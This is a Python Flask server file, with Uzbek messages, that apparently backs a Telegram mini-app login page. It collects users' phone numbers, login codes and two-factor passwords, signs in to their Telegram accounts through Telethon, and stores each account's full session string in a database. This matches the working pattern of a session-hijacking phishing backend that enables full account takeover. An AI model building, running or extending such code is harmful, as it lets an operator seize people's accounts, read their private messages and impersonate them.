import os
import asyncio
from flask import Flask, request, jsonify, render_template

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    FloodWaitError
)

from database import (
    save_login_attempt,
    get_login_attempt,
    delete_login_attempt,
    save_user,
    save_user_session
)

# =====================
# CONFIG
# =====================
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH")

if not API_ID or not API_HASH:
    raise RuntimeError("API_ID yoki API_HASH yo‘q")

# =====================
# APP
# =====================
app = Flask(__name__, template_folder="templates")

# =====================
# ROUTES
# =====================
@app.route("/")
def index():
    return "LOGIN SERVER WORKING"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

# =====================
# SEND CODE
# =====================
@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")
    if not phone:
        return jsonify({"status": "error", "message": "Telefon raqam yo‘q"}), 400

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            sent = await client.send_code_request(phone)
            session_string = client.session.save()
            save_login_attempt(phone, sent.phone_code_hash, session_string)
        finally:
            await client.disconnect()

    try:
        asyncio.run(_send())
        return jsonify({"status": "ok"}), 200

    except FloodWaitError as e:
        return jsonify({
            "status": "error",
            "message": f"{e.seconds} soniya kuting, Telegram vaqtincha blok qo‘ydi"
        }), 429

    except Exception as e:
        print("SEND_CODE ERROR:", repr(e))
        return jsonify({"status": "error", "message": "Server xatosi"}), 500


# =====================
# VERIFY CODE
# =====================
@app.route("/verify_code", methods=["POST"])
def verify_code():
    phone = request.json.get("phone")
    code = request.json.get("code")
    password = request.json.get("password")  # 2FA bo‘lsa

    if not phone or not code:
        return jsonify({"status": "error", "message": "Ma’lumot yetarli emas"}), 400

    attempt = get_login_attempt(phone)
    if not attempt:
        return jsonify({
            "status": "error",
            "message": "Login vaqti tugagan. Qayta kod so‘rang."
        }), 400

    phone_code_hash, session_string = attempt

    async def _verify():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        try:
            try:
                await client.sign_in(
                    phone=phone,
                    code=code,
                    phone_code_hash=phone_code_hash
                )
            except SessionPasswordNeededError:
                if not password:
                    return ("2fa_required", None)

                await client.sign_in(password=password)

            user = await client.get_me()
            final_session = client.session.save()
            return (user, final_session)

        finally:
            await client.disconnect()

    try:
        result = asyncio.run(_verify())

        if result[0] == "2fa_required":
            return jsonify({"status": "2fa_required"}), 200

        user, session_string = result

        # 🔐 DB GA YOZAMIZ
        save_user(user.id, phone, user.username)
        save_user_session(user.id, session_string)

        # 🧹 TEMP LOGINNI O‘CHIRAMIZ
        delete_login_attempt(phone)

        return jsonify({"status": "ok"}), 200

    except PhoneCodeInvalidError:
        return jsonify({"status": "error", "message": "Kod noto‘g‘ri"}), 400

    except Exception as e:
        print("VERIFY_CODE ERROR:", repr(e))
        return jsonify({"status": "error", "message": "Server xatosi"}), 500


# =====================
# RUN
# =====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
